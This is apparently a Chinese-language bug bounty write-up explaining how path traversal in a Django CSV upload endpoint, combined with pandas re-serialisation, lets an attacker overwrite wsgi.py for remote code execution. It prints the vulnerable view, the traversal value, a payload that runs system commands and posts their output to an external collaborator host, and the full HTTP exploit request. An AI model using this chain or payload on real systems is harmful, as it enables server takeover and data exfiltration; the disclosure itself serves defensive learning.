> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531505&idx=1&sn=ef6e5a16657ad393b2f33a8fd5a20296

#  如何在 Django 应用程序中链接目录遍历和 CSV 解析器滥用以进行 RCE  
 Ots安全   2025-07-01 13:14  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
在测试一个 Web 应用程序（作为漏洞赏金计划的一部分）时，我发现了一个严重的 RCE 漏洞，该漏洞利用了目录遍历和巧妙的 CSV 解析滥用。该漏洞利用链结合了目录遍历和巧妙地滥用应用程序使用pandasCSV 解析器的方式，最终允许我覆盖wsgi.py文件并在服务器端执行任意代码。  
  
应用程序行为  
  
存在漏洞的端点允许用户上传 CSV 文件，使用 处理它们pandas，并将结果保存到磁盘。目标函数如下所示：  
  

```
username = request.data.get(&#34;username&#34;)
        upload_file = request.FILES.get(&#34;csv_file&#34;)
        temp_path = f&#34;/tmp/{upload_file.name}&#34;
        with open(temp_path, &#34;wb&#34;) as out_file:
            for chunk in upload_file.chunks():
                out_file.write(chunk)

        # Parse uploaded CSV
        df = pandas.read_csv(temp_path)

        # Determine output path
        base_dir = Path(__file__).resolve().parent.parent
        save_dir = os.path.join(base_dir, &#34;data_store&#34;, username)
        os.makedirs(save_dir, exist_ok=True)

        final_path = os.path.join(save_dir, upload_file.name)
        if os.path.exists(final_path):
            os.remove(final_path)
        df.to_csv(final_path, index=False, encoding=&#34;utf-8&#34;)
        return Response({&#34;status&#34;: &#34;success&#34;}, status=200)
    except Exception ase:
        return Response({&#34;error&#34;: str(e)}, status=500)
```

  
  
这里有两个关键的观察结果：  
- 该username字段直接用于文件系统路径，无需清理。  
  
- 往返发生在保存文件之前pandas.read_csv()。df.to_csv()  
  
这种设置使得制作劫持文件写入位置并在系统上执行代码的有效载荷成为可能。  
  
从路径遍历到文件覆盖  
  
该username字段是受信任的，并用于构建类似 的路径data_store/<username>/file.csv。我只需提交如下值：  
  

```
../../../../../../app/backend/backend/
```

  
  
结果，应用程序将我上传的文件写入：  
  

```
/app/backend/backend/file.csv
```

  
  
通过 CSV 构建有效的 Payload  
  
难点在于如何将代码导入wsgi.py而不引发语法错误。应用会用 解析文件pandas.read_csv()，然后用 重新序列化to_csv()。这意味着我上传的文件在导入之前会被重写wsgi.py。  
  
以下是具体pandas.to_csv()操作：  
- 默认写入标题。  
  
- 用逗号填充行以匹配最大列数。  
  
- 将每个单元格值写为字符串，并可能引用它。  
  
所以我需要我的有效载荷：  
1. 避免在 CSV 解析过程中出现混乱。  
  
1. 添加额外的逗号后仍然是有效的 Python。  
  
诀窍是使用 把我的恶意代码行放在注释中#。这并不能对 Pandas 隐藏它——它会像解析其他行一样解析它——但可以确保to_csv()在文件运行时，Python 会忽略由 添加的任何尾随垃圾代码。Python 会忽略#一行中 a 之后的所有内容，因此即使 a 后面pandas.to_csv()添加了多余的逗号或空格，它们也会被视为注释的一部分并被解释器丢弃。  
  
以下是嵌入在看似无害的 CSV 中的实际有效载荷行：  
  

```
# VALID CSV DATA
import os,requests;from django.core.wsgi import get_wsgi_application;os.environ.setdefault('DJANGO_SETTINGS_MODULE','backend.settings');r=os.popen('whoami&&id&&hostname').read();requests.post('<http://attacker.burpcollaborator.net>',data={'r':r});application = get_wsgi_application();,,,,,
```

  
  
经过pandas的处理之后，在Python看来它仍然像是一行注释，但里面却包含足够的真实逻辑来实现代码执行和重新分配application，满足了Django的期望。  
  
选择正确的代码执行目标  
  
在这个阶段，文件覆盖正在起作用——但要将其升级到 RCE，我需要找到一个应用程序在修改后会自动加载或执行的文件，因为我无法直接手动调用被覆盖的文件。这意味着我需要找到一个 Django 会在访问时隐式重新导入或重新运行的服务器端脚本。于是，我找到了wsgi.py……  
  
为什么是 wsgi.py？  
  
根据WSGI 规范，该wsgi.py文件用于公开一个名为的可调用函数application，作为 Web 服务器与 Python 应用交互的入口点。在 Django 中，通常使用以下方式完成此操作：  
  

```
from django.core.wsgi import get_wsgi_application
application = get_wsgi_application()
```

  
  
在测试过程中，一条冗长的错误消息泄露了项目的文件结构。回溯中包含如下路径：  
  

```
/app/backend/backend/
```

  
  
这种嵌套布局正是使用 - 创建 Django 应用程序时所获得的，django-admin startproject backend其中外层backend/是项目根，内层包含设置wsgi.py、和其他核心文件。  
  
这简直就是wsgi.py完美的目标。我无法运行任意文件，只能覆盖它们——所以我需要一些服务器可以自行执行的代码。Django 的开发服务器会监视wsgi.py更改，并在修改时自动重新加载。这意味着只需触碰文件即可触发执行。通过将我的有效载荷放在 Python 注释中，并以一行空application = get_wsgi_application()行结尾，我保留了 Django 预期的结构，同时实现了远程代码执行。  
  
最终漏洞利用请求  
  
以下是用于实现覆盖的修剪后的 HTTP 请求：  
  

```
POST/api/endpoint HTTP/1.1
Host: target.url
Content-Type: multipart/form-data; boundary=---------------------------boundary
Cookie: session=...

-----------------------------boundary
Content-Disposition: form-data; name=&#34;fleet_csv&#34;; filename=&#34;wsgi.py&#34;
Content-Type: text/csv

# VALID CSV DATA
import os,requests;from django.core.wsgi import get_wsgi_application;os.environ.setdefault('DJANGO_SETTINGS_MODULE','backend.settings');r=os.popen('whoami&&id&&hostname').read();requests.post('<http://attacker.burpcollaborator.net>',data={'r':r});application = get_wsgi_application();,,,,,

-----------------------------boundary
Content-Disposition: form-data; name=&#34;report_date&#34;

2025-01-01
-----------------------------boundary
Content-Disposition: form-data; name=&#34;username&#34;

../../../../../../app/backend/backend/
-----------------------------boundary--
```

  
  
响应确认成功：  
  

```
{&#34;status&#34;: &#34;success&#34;}
```

  
  
几秒钟后，我的服务器收到了带有命令输出的回调。  
  
结论  
  
此次漏洞利用的可能原因如下：  
- 文件系统路径中用户输入的使用未经净化。  
  
- 使用不安全的文件解析和重写pandas。  
  
- Django 在调试模式下的自动重新加载行为。  
  
通过组合这些行为，我能够从基本的文件上传到服务器上的完整 RCE。这里真正的教训是，即使是像 CSV 解析这样看似无害的操作，在错误的环境中也可能变得危险——尤其是在与文件系统访问和自动执行的服务器文件相结合时。  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
